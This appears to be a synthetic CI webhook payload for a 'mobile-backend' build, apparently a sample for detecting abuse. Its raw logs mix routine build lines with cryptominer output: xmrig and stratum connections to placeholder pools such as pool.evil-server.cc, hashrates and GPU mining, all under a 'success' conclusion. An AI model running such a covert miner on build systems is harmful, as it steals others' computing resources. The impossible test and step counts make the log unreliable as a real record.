{
  "action": "completed",
  "workflow_run": {
    "id": 942,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-200",
    "head_sha": "8ec6409db90aab79be808f3aaf8a522d2cff3e4f",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-13T12:47:58.990963Z",
    "updated_at": "2025-12-13T12:56:48.686301Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\n[12:47:58] DEBUG: Initializing service\nTLS handshake completed\nPulling image: alpine:latest\nHEAD is now at 09a61df\nCache invalidated: dependencies\nException: TypeError\nStep 14/17: Linting\nTransforming 702 files...\nBuilding Docker image...\nCompiling lib/index.js...\npip: Installing build dependencies...\nStep 20/15: Deploying\nCompiling src/service.java...\nStep 3/18: Installing dependencies\nBuilding Docker image...\nSuccess!\npip install: Successfully installed eslint-5.19\nPlatform: win32-x64\n[12:47:58] INFO: Cache refreshed\nUploading artifact 'coverage' (25 files)\nBuilding Docker image...\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 1391499\nCache restored successfully (462MB)\nCompiling src/utils.go...\nConnection established\nInstalling webpack@4.15.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nStep 13/21: Linting\nnpm install: resolved 1045 packages\n[12:47:58] WARN: Deprecated API usage\n\u2717 build failed with exit code 40\npip install: Successfully installed lodash-1.13\nRan 198 tests in 54s\n\u2713 All checks passed\nBuilding Docker image...\nUploading artifact 'dist' (9 files)\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_api_health\nBuilding Docker image...\nTests: 280 passed, 367 total\nCache invalidated: build\nStep 7/17: Installing dependencies\nChecking out develop branch\nStep 18/16: Linting\nCompiling lib/app.ts...\nTest Suites: 21 passed, 21 total\n[12:47:58] DEBUG: Loading configuration\nnpm install: resolved 1861 packages\n[12:47:58] DEBUG: Connection pool: 19 active\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nCompiling src/service.java...\nProcessing...\nException: NullPointerException\npip install: Successfully installed webpack-5.13\nNODE_ENV=test\nTransforming 866 files...\nMinifying main.js\nnpm install: resolved 860 packages\nCompiling utils/utils.go...\nStep 9/18: Testing\n  PASS: integration/test_db_connect.spec.js\nCoverage: 92% statements, 80% branches\n[12:47:58] INFO: Processing request\npip: Installing build dependencies...\nCache saved successfully\n[12:47:58] INFO: Starting build process\nGET /api - 201 (14ms)\n\u2713 validate completed\nnpm install: resolved 1215 packages\n[12:47:58] DEBUG: Memory usage: 1662MB\nEnvironment: staging\nGET /api - 204 (73ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/22: Linting\nProcessing...\nStep 19/23: Testing\nAlready up to date.\n[12:47:58] DEBUG: Memory usage: 1822MB\nFetching from https://pypi.org/package.json\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (4MB)\nBundling runtime.css\nSwitched to branch 'feature/task-904'\nLayer 2/13: ENV command\n[12:47:58] WARN: Deprecated API usage\nOK\nCompiling lib/service.java...\nChecking out develop branch\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nStep 17/17: Running migrations\n\u2713 All checks passed\nProcessing...\nTests: 150 passed, 160 total\n\u2717 build failed with exit code 11\nImage pulled successfully\npip: Downloading lodash-4.17.tar.gz\nTests: 290 passed, 323 total\npip: Downloading react-1.15.tar.gz\npip: Installing build dependencies...\n[12:47:58] ERROR: Connection failed\npip: Installing build dependencies...\n[12:47:58] DEBUG: Connection pool: 2 active\nReady.\nCompiling utils/main.py...\n\u2713 All checks passed\nStep 20/16: Running migrations\n\u2717 build failed with exit code 1\nArtifact downloaded: 15MB\nnpm install: resolved 1107 packages\n\u2713 Step 'setup' succeeded\nStep 16/25: Deploying\nnpm notice: package.json updated\n  PASS: unit/test_api_health.spec.js\n[12:47:58] DEBUG: Loading configuration\nTransforming 435 files...\n[12:47:58] DEBUG: Initializing service\nLayer 2/14: ENV command\n\u2713 Step 'setup' succeeded\nAlready up to date.\nFAILED: test_db_connect\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nMinifying vendor.js\n[12:47:58] INFO: Cache refreshed\nSuccess!\nCache restored successfully (48MB)\nStep 13/16: Installing dependencies\nCoverage: 95% statements, 70% branches\nCompleted.\n[12:47:58] DEBUG: Initializing service\nImage pulled successfully\n[12:47:58] DEBUG: Query executed in 76ms\nOptimizing 99 modules...\nCompiling src/app.ts...\n\u2713 Step 'setup' succeeded\nCache saved successfully\nReady.\nWaiting...\nCache miss for key-7468\npip: Collecting lodash\n[12:47:59] INFO: Connecting to database\nTime: 98.995s\nnpm install: added 28 packages\nWARNING: jest has known vulnerabilities\nCache invalidated: node_modules\n\u2713 All checks passed\nVerifying...\nMinifying vendor.js\nArtifact uploaded: dist.zip (73MB)\nArtifact uploaded: dist.zip (12MB)\n  PASS: test_cache_hit (45ms)\nStep 17/19: Linting\n[12:47:59] DEBUG: Loading configuration\nReady.\nyarn add: Done in 18.29s\nCompiling utils/main.py...\nBundling styles.js\n[12:47:59] INFO: Request completed\nOptimizing 100 modules...\nVerifying...\nCache saved successfully\n  PASS: test_auth_login (441ms)\nUploading artifact 'build' (22 files)\nImage pulled successfully\nOptimizing 60 modules...\nInstalling webpack@3.14.5\n\u2713 All checks passed\nTime: 46.957s\nVerifying...\n[12:47:59] WARN: Deprecated API usage\nProcessing...\n\u2713 Task completed in 915ms\nyarn add: Done in 12.81s\nDone.\nPOST /upload - 201 (281ms)\nCache saved successfully\nTests: 412 passed, 209 total\nNODE_ENV=test\nSnapshots: 34 passed, 7 total\nNODE_ENV=test\nConnection established\npip: Collecting eslint\nException: TypeError\nTLS handshake completed\nChecking out master branch\nCompleted.\nStep 1/21: Running migrations\nFAILED: test_user_create\nProcessing...\n\u2713 All checks passed\nFetching from https://githubusercontent.com/package.json\nEnvironment: development\nTime: 90.293s\nWARNING: webpack has known vulnerabilities\nStep 20/18: Building\nOptimizing 62 modules...\nCoverage: 71% statements, 81% branches\n\u2713 lint completed\nCompiling lib/service.java...\n[12:47:59] INFO: Connecting to database\n[12:47:59] INFO: Processing request\n[12:47:59] ERROR: Connection failed\nCompiling components/utils.go...\nCompiling lib/service.java...\n[12:47:59] DEBUG: Connection pool: 10 active\npip: Downloading express-4.11.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://githubusercontent.com/package.json\n[12:47:59] DEBUG: Memory usage: 620MB\nCompiling utils/utils.go...\nLoading...\nCache invalidated: node_modules\npip: Downloading axios-1.13.tar.gz\nEnvironment: staging\nStep 9/16: Installing dependencies\n\u2713 Step 'test' succeeded\nStep 20/19: Running migrations\nBundling styles.css\npip: Collecting jest\nCompiling utils/app.ts...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (5MB)\n[12:47:59] WARN: Deprecated API usage\nTransforming 434 files...\nStep 15/23: Building\n[12:47:59] WARN: Deprecated API usage\nCache miss for key-4295\nGenerating source maps...\nCompiling utils/service.java...\nLayer 9/8: RUN command\nCompleted.\n[12:47:59] DEBUG: Query executed in 98ms\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nCoverage: 82% statements, 94% branches\n\u2713 Task completed in 713ms\nRan 187 tests in 40s\nStep 11/17: Deploying\nCompleted.\nOK\npip: Downloading eslint-3.16.tar.gz\n[12:47:59] DEBUG: Connection pool: 15 active\nImage pulled successfully\nWARNING: lodash has known vulnerabilities\nStep 16/21: Testing\npip install: Successfully installed react-4.14\nChecking out develop branch\nCompiling lib/service.java...\nOK\nRan 55 tests in 10s\nVerifying...\nArtifact uploaded: dist.zip (44MB)\npip: Downloading prettier-1.20.tar.gz\nCompiling utils/app.ts...\nCache invalidated: build\npip: Installing build dependencies...\nCompiling lib/main.py...\n[12:47:59] WARN: Deprecated API usage\ncryptonight: Hashrate: 2192 H/s\nException: NullPointerException\nInstalling axios@5.14.10\nWARNING: prettier has known vulnerabilities\n\u2713 All checks passed\nCompleted.\nCompleted.\n[12:47:59] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\nCache miss for key-5796\nWaiting...\n[12:47:59] ERROR: Connection failed\nVerifying...\n[12:47:59] DEBUG: Query executed in 90ms\nGPU #0: 69\u00b0C, mining\nCoverage: 94% statements, 87% branches\nCompiling components/handler.rs...\nCreating production build...\nFinished.\nxmrig: Starting mining on pool.evil-server.cc:3333\nAlready up to date.\nOptimizing 68 modules...\nnpm install: resolved 818 packages\nAlready up to date.\nFAILED: test_user_create\nWARNING: webpack has known vulnerabilities\nProcessing...\n[12:47:59] DEBUG: Memory usage: 560MB\nMinifying main.js\nMinifying main.js\n[12:47:59] DEBUG: Memory usage: 1279MB\nReady.\npip install: Successfully installed jest-3.1\nImage pulled successfully\nTest Suites: 23 passed, 45 total\nWaiting...\n[12:47:59] WARN: Deprecated API usage\nLoading...\nWARNING: jest has known vulnerabilities\nRan 55 tests in 3s\nFetching submodules...\n[12:47:59] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/25: Deploying\n[12:47:59] INFO: Request completed\nEnvironment: production\nFinished.\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (50MB)\nStep 7/22: Running migrations\nStep 7/22: Linting\nProcessing...\nGPU #0: 85\u00b0C, mining\nCache hit for key-4851\n[12:47:59] INFO: Request completed\nWaiting...\nFetching from https://amazonaws.com/package.json\nnpm install: resolved 502 packages\nCoverage: 87% statements, 65% branches\nStep 9/16: Running migrations\nMinifying vendor.js\nBundling main.js\n[12:47:59] INFO: Request completed\nMinifying vendor.js\nWARNING: eslint has known vulnerabilities\npip: Downloading webpack-3.19.tar.gz\nTLS handshake completed\n[12:47:59] DEBUG: Query executed in 21ms\n\u2713 Step 'build' succeeded\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nPulling image: alpine:3.11\nArtifact downloaded: 14MB\nPulling image: node:18\nTests: 313 passed, 110 total\n[12:47:59] INFO: Cache refreshed\nException: NullPointerException\n[12:47:59] WARN: Deprecated API usage\nFinished.\nReady.\nWaiting...\nTransforming 714 files...\nNODE_ENV=production\nAlready up to date.\n[12:47:59] WARN: Deprecated API usage\nCompiling components/main.py...\nTransforming 175 files...\nnpm install: resolved 1942 packages\nCache hit for key-5912\n[12:47:59] INFO: Cache refreshed\nStep 4/25: Deploying\nOK\n[12:47:59] DEBUG: Initializing service\nFetching from https://registry.npmjs.org/package.json\n[12:47:59] DEBUG: Initializing service\nUsing Node.js 17.5.9\nLayer 7/9: ENV command\nReady.\nPulling image: node:3.11\nStep 7/23: Testing\nnpm install: resolved 1636 packages\n\u2713 Step 'install' succeeded\nCompleted.\n\u2713 test completed\nFetching from https://gcr.io/package.json\nFetching submodules...\nCoverage: 74% statements, 61% branches\nWaiting...\nCreating production build...\nPOST /data - 202 (60ms)\nPushing to registry...\n[12:47:59] DEBUG: Initializing service\nCoverage: 95% statements, 82% branches\nStep 16/19: Testing\nCache saved successfully\nReady.\n[12:47:59] DEBUG: Query executed in 100ms\nConnection established\n[12:47:59] INFO: Request completed\n\u2713 All checks passed\nSuccess!\nRan 185 tests in 19s\n\u2713 Step 'build' succeeded\nSnapshots: 40 passed, 31 total\nBuilding Docker image...\nArtifact uploaded: dist.zip (52MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 16/23: Installing dependencies\nCache miss for key-2984\n[12:47:59] INFO: Cache refreshed\n\u2713 test completed\nWaiting...\nTest Suites: 35 passed, 13 total\nUsing Python 3.12\nArtifact uploaded: dist.zip (41MB)\nCache invalidated: node_modules\n[12:47:59] WARN: Deprecated API usage\nProcessing...\nArtifact uploaded: dist.zip (3MB)\nCache restored successfully (44MB)\n  PASS: unit/test_api_health.spec.js\nnpm notice: package.json updated\nNODE_ENV=test\nnpm install: resolved 527 packages\nBuilding Docker image...\n[12:47:59] INFO: Starting build process\nCoverage: 73% statements, 97% branches\nWARNING: jest has known vulnerabilities\n\u2713 Task completed in 3094ms\n\u2713 Step 'setup' succeeded\nAlready up to date.\nnpm install: added 343 packages\nCoverage: 90% statements, 67% branches\nWARNING: axios has known vulnerabilities\nStep 4/16: Running migrations\nnpm install: added 14 packages\nHEAD is now at 58c0cb6\nFetching submodules...\n[12:47:59] DEBUG: Connection pool: 11 active\nTest Suites: 44 passed, 38 total\nLayer 9/12: RUN command\nAccepted share #793\nSuccess!\nUsing Node.js 17.2.8\nWaiting...\n[12:47:59] DEBUG: Connection pool: 10 active\nCache invalidated: dependencies\nPushing to registry...\nTime: 9.526s\nminerd: 9 threads active\nSwitched to branch 'bugfix/task-181'\nStep 5/16: Testing\nChecking out main branch\nStep 11/15: Building\n\u2713 Task completed in 2947ms\nTest Suites: 13 passed, 29 total\n\u2717 build failed with exit code 113\nArtifact uploaded: dist.zip (42MB)\nTime: 120.835s\nnpm notice: created a lockfile\n\u2713 All checks passed\nSnapshots: 23 passed, 17 total\npip: Installing build dependencies...\nVerifying...\nEnvironment: development\n  PASS: test_db_connect (475ms)\nPulling image: python:latest\nTime: 58.573s\nPulling image: node:3.11\nPOST /api - 201 (439ms)\nOK\nStep 17/21: Linting\nPushing to registry...\nSuccess!\n\u2713 All checks passed\nBundling runtime.css\nyarn add: Done in 9.35s\nPOST /api - 201 (45ms)\nMinifying main.js\nCache miss for key-3888\n\u2713 All checks passed\nnpm install: added 386 packages\nLoading...\nCache restored successfully (272MB)\n[12:47:59] DEBUG: Query executed in 89ms\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] INFO: Request completed\nnpm install: added 136 packages\n\u2713 Step 'setup' succeeded\nCompiling lib/main.py...\nAccepted share #340\n[12:47:59] DEBUG: Connection pool: 20 active\nCompiling utils/service.java...\nAlready up to date.\nTLS handshake completed\nCache saved successfully\nStep 7/21: Deploying\nException: ValueError\nnpm install: added 54 packages\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nminerd: 16 threads active\nWARNING: react has known vulnerabilities\nFAILED: test_db_connect\nArtifact uploaded: dist.zip (54MB)\nBuilding Docker image...\npip: Collecting prettier\nCompiling lib/index.js...\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nCompiling components/main.py...\nGenerating source maps...\nCompiling src/service.java...\nLayer 6/12: ENV command\n[12:47:59] DEBUG: Memory usage: 1884MB\nException: TypeError\n[12:47:59] DEBUG: Query executed in 98ms\nnpm notice: created a lockfile\nDone.\nAlready up to date.\nCompiling components/handler.rs...\nException: ValueError\nProcessing...\nStep 1/16: Installing dependencies\n[12:47:59] DEBUG: Query executed in 30ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\n\u2713 All checks passed\nCompiling utils/main.py...\nLayer 10/15: COPY command\nImage pulled successfully\nPushing to registry...\nPlatform: linux-x64\n  PASS: unit/test_cache_hit.spec.js\nPlatform: darwin-arm64\nStep 3/21: Deploying\nCache miss for key-7934\nOK\nEnvironment: test\nImage pulled successfully\nSnapshots: 10 passed, 6 total\nArtifact downloaded: 1MB\nLayer 10/15: ENV command\n[12:47:59] DEBUG: Loading configuration\nCompiling src/handler.rs...\nOK\nnpm install: added 90 packages\npip: Collecting eslint\nChecking out develop branch\n\u2713 validate completed\nGenerating source maps...\n  PASS: test_cache_hit (135ms)\n\u2713 Step 'checkout' succeeded\nFinished.\nReady.\n[12:47:59] DEBUG: Loading configuration\n[12:47:59] DEBUG: Query executed in 45ms\nStep 8/24: Building\nPushing to registry...\nTests: 292 passed, 97 total\nChecking out main branch\n\u2713 Step 'checkout' succeeded\n[12:47:59] INFO: Starting build process\n  PASS: test_db_connect (218ms)\n\u2713 Step 'checkout' succeeded\nReady.\nPulling image: node:18\nBundling runtime.js\nStep 13/24: Running migrations\n[12:47:59] DEBUG: Memory usage: 1034MB\n[12:47:59] INFO: Processing request\nCompiling utils/utils.go...\nOptimizing 59 modules...\nWARNING: express has known vulnerabilities\nCache restored successfully (382MB)\nStep 8/17: Running migrations\nWARNING: axios has known vulnerabilities\nOptimizing 96 modules...\n[12:47:59] DEBUG: Query executed in 58ms\n[12:47:59] ERROR: Connection failed\nCompiling components/index.js...\nStep 1/19: Linting\nyarn add: Done in 2.75s\nNODE_ENV=production\n[12:47:59] DEBUG: Initializing service\n  PASS: test_db_connect (285ms)\n[12:47:59] DEBUG: Initializing service\nGET /api - 201 (56ms)\nUsing Python 3.9\nArtifact downloaded: 9MB\nHEAD is now at 9f94300\nFetching submodules...\n[12:47:59] ERROR: Connection failed\nTest Suites: 35 passed, 25 total\nImage pulled successfully\nPulling image: node:18\nException: ValueError\nHEAD is now at 4d80d9a\nConnection established\nOK\nnpm notice: package.json updated\nCache restored successfully (465MB)\nStep 17/19: Linting\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nPlatform: darwin-arm64\nVerifying...\nCompiling utils/utils.go...\n\u2717 build failed with exit code 113\nStep 15/17: Deploying\nArtifact uploaded: build.tar.gz (15MB)\nnpm install: resolved 1036 packages\nCache saved successfully\nnpm install: added 472 packages\n\u2713 Task completed in 1918ms\nCompleted.\n\u2717 build failed with exit code 91\nVerifying...\npip: Installing build dependencies...\n  PASS: unit/test_cache_hit.spec.js\nGenerating source maps...\n[12:47:59] INFO: Connecting to database\nDone.\npip: Collecting jest\nNODE_ENV=test\n[12:47:59] WARN: Deprecated API usage\n[12:47:59] DEBUG: Connection pool: 20 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\npip install: Successfully installed eslint-4.1\nTLS handshake completed\nCreating production build...\nImage pulled successfully\nStep 20/18: Deploying\nGenerating source maps...\nnpm notice: created a lockfile\n[12:47:59] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (73MB)\n  PASS: integration/test_auth_login.spec.js\nUsing Python 3.9\nPOST /upload - 202 (66ms)\n\u2717 build failed with exit code 34\nTime: 93.329s\nDone.\nCache hit for key-6156\nyarn add: Done in 25.77s\npip: Downloading eslint-2.0.tar.gz\nUsing Node.js 16.19.9\nArtifact uploaded: build.tar.gz (12MB)\nEnvironment: production\n[12:47:59] DEBUG: Loading configuration\nCreating production build...\n[12:47:59] INFO: Processing request\nGenerating source maps...\nTransforming 857 files...\nCache hit for key-5290\nRan 30 tests in 44s\nReady.\nArtifact uploaded: build.tar.gz (14MB)\n[12:47:59] DEBUG: Memory usage: 1754MB\nTransforming 561 files...\nMinifying app.js\nStep 20/20: Linting\nRan 77 tests in 35s\n\u2713 Step 'setup' succeeded\n[12:47:59] DEBUG: Query executed in 88ms\n[12:47:59] WARN: Deprecated API usage\nFinished.\nStep 8/24: Testing\nCompiling utils/app.ts...\nTLS handshake completed\nArtifact downloaded: 12MB\n[12:47:59] INFO: Connecting to database\n[12:47:59] INFO: Request completed\nCompiling components/index.js...\nStep 17/20: Linting\npip: Downloading express-5.19.tar.gz\nCache hit for key-2756\nSwitched to branch 'bugfix/task-384'\n[12:47:59] INFO: Request completed\nCache miss for key-1747\nLoading...\nTest Suites: 14 passed, 14 total\npip: Installing build dependencies...\nDone.\n[12:47:59] WARN: Deprecated API usage\nTLS handshake completed\nInstalling prettier@2.14.9\n[12:47:59] INFO: Connecting to database\nBundling vendor.css\npip: Collecting jest\nWARNING: axios has known vulnerabilities\nPlatform: linux-x64\nVerifying...\nMinifying app.js\nOptimizing 95 modules...\n\u2713 deploy completed\nProcessing...\n[12:47:59] INFO: Processing request\nCoverage: 92% statements, 81% branches\nFetching from https://githubusercontent.com/package.json\nTime: 65.269s\nArtifact downloaded: 39MB\nException: ValueError\nCompiling utils/service.java...\nStep 5/24: Testing\nTransforming 221 files...\nWaiting...\nCompiling utils/service.java...\nPlatform: linux-x64\nWARNING: jest has known vulnerabilities\nChecking out master branch\nyarn add: Done in 3.55s\nConnection established\nDone.\nNODE_ENV=test\n[12:47:59] DEBUG: Connection pool: 7 active\nChecking out main branch\n[12:47:59] DEBUG: Memory usage: 1463MB\n[12:47:59] INFO: Processing request\nEnvironment: staging\nFAILED: test_api_health\nImage pulled successfully\nCompiling src/app.ts...\n\u2713 validate completed\nHEAD is now at 35ccc9a\nVerifying...\n[12:47:59] DEBUG: Memory usage: 1799MB\nUsing Node.js 15.3.5\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n[12:47:59] DEBUG: Memory usage: 1946MB\nFetching submodules...\nnpm install: resolved 1831 packages\nBuilding Docker image...\n\u2713 Task completed in 2368ms\nCompleted.\nnpm notice: created a lockfile\nTests: 230 passed, 57 total\nUsing Node.js 20.4.4\nyarn add: Done in 30.33s\n[12:47:59] DEBUG: Connection pool: 7 active\nArtifact downloaded: 8MB\nCompiling components/handler.rs...\npip: Downloading express-3.4.tar.gz\nPlatform: win32-x64\nArtifact downloaded: 45MB\nBuilding Docker image...\nCache invalidated: node_modules\n=== Step save_cache completed ===\n=== Step: checkout ===\nCreating production build...\nMinifying app.js\nStep 8/23: Testing\nStep 10/24: Deploying\n[12:47:59] DEBUG: Connection pool: 18 active\nTest Suites: 15 passed, 37 total\nChecking out main branch\nStep 10/15: Linting\nRan 136 tests in 39s\nCompiling lib/main.py...\n[12:47:59] WARN: Deprecated API usage\nCache hit for key-6353\nWaiting...\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\n\u2713 Step 'install' succeeded\n  PASS: integration/test_auth_login.spec.js\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nChecking out develop branch\nNODE_ENV=test\n[12:47:59] DEBUG: Query executed in 75ms\nImage pulled successfully\nEnvironment: production\nFAILED: test_db_connect\nReady.\nCache restored successfully (278MB)\nImage pulled successfully\nSuccess!\nCache invalidated: node_modules\n[12:47:59] DEBUG: Initializing service\nInstalling express@1.7.2\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.10\npip: Installing build dependencies...\nCompiling lib/app.ts...\nOptimizing 27 modules...\nFinished.\nGET /health - 200 (6ms)\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:59] INFO: Starting build process\nCache miss for key-6228\nUploading artifact 'coverage' (6 files)\nInstalling express@4.7.9\nSwitched to branch 'hotfix/task-789'\nTransforming 509 files...\nStep 5/24: Deploying\n[12:47:59] DEBUG: Memory usage: 1394MB\n\u2713 deploy completed\n  PASS: integration/test_auth_login.spec.js\nWARNING: lodash has known vulnerabilities\nCompiling lib/main.py...\n  PASS: test_db_connect (306ms)\npip: Downloading express-2.17.tar.gz\nyarn add: Done in 22.72s\n\u2713 All checks passed\nCache miss for key-3061\nRan 61 tests in 29s\n[12:47:59] INFO: Connecting to database\n\u2717 build failed with exit code 13\nPulling image: node:3.11\nnpm notice: package.json updated\npip: Installing build dependencies...\nOptimizing 97 modules...\nTests: 308 passed, 77 total\n[12:47:59] INFO: Processing request\n\u2713 Task completed in 386ms\nSuccess!\nBuilding Docker image...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 24\nGET /status - 201 (100ms)\nFAILED: test_user_create\nnpm notice: package.json updated\npip: Installing build dependencies...\nUploading artifact 'coverage' (14 files)\nSnapshots: 25 passed, 11 total\nOK\nStep 8/22: Running migrations\nStep 4/17: Linting\nStep 2/20: Linting\nCreating production build...\nHEAD is now at 3bb467d\nPOST /data - 202 (36ms)\nCreating production build...\npip: Installing build dependencies...\nnpm notice: package.json updated\nPOST /data - 202 (438ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\nnpm notice: package.json updated\nGenerating source maps...\nTime: 85.869s\n[12:47:59] INFO: Starting build process\nCompiling components/service.java...\n\u2713 deploy completed\n[12:47:59] WARN: Deprecated API usage\nFetching from https://github.com/package.json\nBuilding Docker image...\nFinished.\nEnvironment: development\nLayer 2/10: RUN command\n[12:47:59] INFO: Request completed\nEnvironment: production\nGET /api - 204 (67ms)\nPushing to registry...\nCompleted.\n[12:47:59] DEBUG: Query executed in 73ms\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\nFinished.\n[12:47:59] INFO: Connecting to database\npip: Installing build dependencies...\nCoverage: 75% statements, 70% branches\nAlready up to date.\nStep 1/15: Installing dependencies\nArtifact uploaded: dist.zip (94MB)\n[12:47:59] DEBUG: Query executed in 9ms\nStep 12/15: Running migrations\n[12:47:59] INFO: Cache refreshed\nCache miss for key-9511\nPOST /api - 202 (496ms)\nWaiting...\n[12:47:59] INFO: Cache refreshed\n[12:47:59] WARN: Deprecated API usage\nCache restored successfully (494MB)\nCompiling lib/index.js...\nArtifact uploaded: build.tar.gz (17MB)\npip: Downloading lodash-4.7.tar.gz\nTest Suites: 49 passed, 6 total\nPushing to registry...\nConnection established\nUsing Node.js 16.3.10\nOK\nCache invalidated: dependencies\nCreating production build...\n\u2713 All checks passed\nPulling image: python:3.11\n[12:47:59] DEBUG: Query executed in 55ms\n\u2713 All checks passed\nPushing to registry...\nCreating production build...\nnpm notice: package.json updated\n\u2713 Step 'build' succeeded\nCache miss for key-6647\nEnvironment: production\nTransforming 765 files...\nStep 19/19: Testing\nLoading...\nAlready up to date.\npip: Collecting lodash\n[12:47:59] WARN: Deprecated API usage\nOK\nDone.\nException: RuntimeError\nHEAD is now at 7df64d7\nRan 25 tests in 17s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out master branch\npip: Installing build dependencies...\nTest Suites: 47 passed, 20 total\nTLS handshake completed\npip: Collecting axios\nFAILED: test_auth_login\nCompiling lib/main.py...\n\u2713 Step 'setup' succeeded\nPulling image: python:3.11\nStep 16/16: Deploying\nFetching submodules...\nImage pulled successfully\nCoverage: 99% statements, 78% branches\nGenerating source maps...\nNODE_ENV=production\nGenerating source maps...\nLayer 6/13: RUN command\nFetching from https://npmjs.org/package.json\nRan 25 tests in 24s\n[12:47:59] WARN: Deprecated API usage\nGenerating source maps...\nEnvironment: production\nException: ValueError\nLoading...\nCompiling src/service.java...\nLayer 7/10: COPY command\nFinished.\nCache miss for key-9845\nDone.\nPlatform: win32-x64\n[12:47:59] INFO: Cache refreshed\nLoading...\nnpm install: resolved 1029 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\n[12:47:59] DEBUG: Memory usage: 1494MB\nPOST /data - 200 (276ms)\n[12:47:59] DEBUG: Loading configuration\nLayer 8/15: RUN command\nMinifying main.js\nCache invalidated: build\nStep 8/23: Deploying\nStep 13/20: Installing dependencies\nStep 2/22: Building\nCoverage: 84% statements, 77% branches\nStep 6/22: Building\n\u2717 build failed with exit code 85\n\u2713 Task completed in 2160ms\nCache miss for key-5926\nStep 13/19: Testing\n[12:47:59] DEBUG: Query executed in 57ms\nTransforming 682 files...\n[12:47:59] INFO: Processing request\nConnection established\nTest Suites: 21 passed, 21 total\nStep 11/20: Installing dependencies\nGET /api - 200 (86ms)\nCache miss for key-5754\nnpm install: added 394 packages\n[12:47:59] ERROR: Connection failed\nnpm install: resolved 1988 packages\nSnapshots: 32 passed, 27 total\nPulling image: alpine:latest\nHEAD is now at f274201\nStep 3/25: Building\n[12:47:59] DEBUG: Connection pool: 4 active\nTests: 326 passed, 287 total\nCompiling utils/index.js...\nLayer 7/8: COPY command\n[12:47:59] INFO: Cache refreshed\nStep 19/25: Testing\n[12:47:59] WARN: Deprecated API usage\nPushing to registry...\nGenerating source maps...\npip install: Successfully installed jest-4.18\nLoading...\npip: Installing build dependencies...\nLoading...\nWARNING: axios has known vulnerabilities\n=== Step checkout completed ===\n=== Step: integration_tests ===\npip: Downloading axios-3.6.tar.gz\nEnvironment: test\ncryptonight: Hashrate: 7549 H/s\n[12:47:59] INFO: Cache refreshed\n\u2713 Task completed in 1911ms\n[12:47:59] INFO: Processing request\n\u2713 package completed\n\u2717 build failed with exit code 44\npip: Downloading jest-3.17.tar.gz\n[12:47:59] INFO: Cache refreshed\nCompiling src/main.py...\nInstalling eslint@4.18.2\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:59] DEBUG: Connection pool: 12 active\nCache miss for key-3986\nFAILED: test_api_health\nOptimizing 12 modules...\n[12:47:59] INFO: Connecting to database\nCoverage: 94% statements, 63% branches\nVerifying...\nTime: 30.735s\nStep 12/23: Building\npip: Collecting webpack\nCompiling src/app.ts...\nUsing Node.js 18.9.7\nTLS handshake completed\nCreating production build...\nTransforming 321 files...\nGenerating source maps...\nCoverage: 78% statements, 64% branches\nFetching submodules...\nTransforming 346 files...\nnpm notice: package.json updated\nxmrig: Starting mining on pool.malicious-pool.xyz:3333\nCache miss for key-9105\npip: Downloading express-5.20.tar.gz\nminerd: 9 threads active\n[12:47:59] INFO: Connecting to database\nTest Suites: 20 passed, 18 total\nUsing Python 3.11\n[12:47:59] INFO: Processing request\nVerifying...\n  PASS: test_db_connect (61ms)\nFinished.\n[12:47:59] DEBUG: Connection pool: 10 active\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\nVerifying...\n[12:47:59] ERROR: Connection failed\nArtifact uploaded: dist.zip (16MB)\nTime: 51.686s\nLoading...\nyarn add: Done in 19.79s\nLoading...\n[12:47:59] INFO: Cache refreshed\nUsing Node.js 15.5.4\nException: NullPointerException\nGenerating source maps...\nException: TypeError\nGET /status - 200 (63ms)\n\u2717 build failed with exit code 53\nBundling styles.js\ncryptonight: Hashrate: 890 H/s\n[12:47:59] INFO: Cache refreshed\nCache saved successfully\nArtifact downloaded: 29MB\nCache invalidated: dependencies\nnpm notice: created a lockfile\nCreating production build...\nArtifact uploaded: build.tar.gz (28MB)\nminerd: 5 threads active\nTest Suites: 37 passed, 14 total\nInstalling react@3.0.5\n\u2713 Step 'test' succeeded\npip 